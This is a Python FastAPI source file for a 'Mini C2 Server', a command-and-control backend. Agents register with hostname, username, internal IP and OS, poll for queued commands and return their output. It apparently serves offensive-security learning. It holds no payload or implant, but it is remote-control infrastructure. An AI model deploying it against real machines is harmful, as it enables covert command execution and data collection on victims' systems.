from contextlib import asynccontextmanager
from typing import AsyncGenerator

from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession

from api.schemas import (
    AgentCheckIn, 
    TaskRequest, 
    TaskResultRequest,
    CheckInResponse, 
    TaskResponse, 
    TaskResultResponse,
    AdminTaskResponse
)
from core.database import get_db, init_db
from core.crud import (
    create_or_update_agent,
    get_pending_task,
    create_task,
    get_task_queue_position,
    update_task_result,
)


@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
    """Lifecycle: crée les tables au démarrage."""
    await init_db()
    print("✅ Database initialized")
    yield


app = FastAPI(title="Mini C2 Server", lifespan=lifespan)


# --- ROUTES ---

# 1. Check-in
@app.post("/api/v1/checkin", response_model=CheckInResponse)
async def agent_checkin(
    data: AgentCheckIn,
    db: AsyncSession = Depends(get_db),
) -> CheckInResponse:
    print(f"🔔 CHECK-IN: {data.hostname} ({data.agent_id})")
    
    await create_or_update_agent(
        db=db,
        agent_id=data.agent_id,
        username=data.username,
        hostname=data.hostname,
        internal_ip=data.internal_ip,
        os_version=data.os_version,
    )

    return CheckInResponse(status="registered", message="Bienvenue")


# 2. Polling
@app.get("/api/v1/tasks/{agent_id}", response_model=TaskResponse)
async def get_tasks(
    agent_id: str,
    db: AsyncSession = Depends(get_db),
) -> TaskResponse:
    
    task = await get_pending_task(db, agent_id)
    
    if task:
        print(f"📤 ENVOI: '{task.command}' -> {agent_id}")
        return TaskResponse(task_id=task.id, command=task.command)

    return TaskResponse(task_id=None, command=None)


# 3. Admin
@app.post("/api/v1/admin/tasks", response_model=AdminTaskResponse)
async def add_task(
    task: TaskRequest,
    db: AsyncSession = Depends(get_db),
) -> AdminTaskResponse:
    
    try:
        await create_task(db=db, agent_id=task.agent_id, command=task.command)
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))
    
    position = await get_task_queue_position(db, task.agent_id) + 1
    
    print(f"✅ TÂCHE AJOUTÉE: '{task.command}'")

    return AdminTaskResponse(status="queued", position=position)


# 4. Task Result (Agent sends back command output)
@app.post("/api/v1/tasks/result", response_model=TaskResultResponse)
async def submit_task_result(
    data: TaskResultRequest,
    db: AsyncSession = Depends(get_db),
) -> TaskResultResponse:
    
    task = await update_task_result(
        db=db,
        task_id=data.task_id,
        agent_id=data.agent_id,
        result=data.result,
        success=data.success,
    )
    
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    
    status = "completed" if data.success else "failed"
    print(f"📥 RÉSULTAT [{status}]: Task #{data.task_id}")
    print(f"   └─ {data.result[:100]}{'...' if len(data.result) > 100 else ''}")

    return TaskResultResponse(status="received", message=f"Task #{data.task_id} marked as {status}")
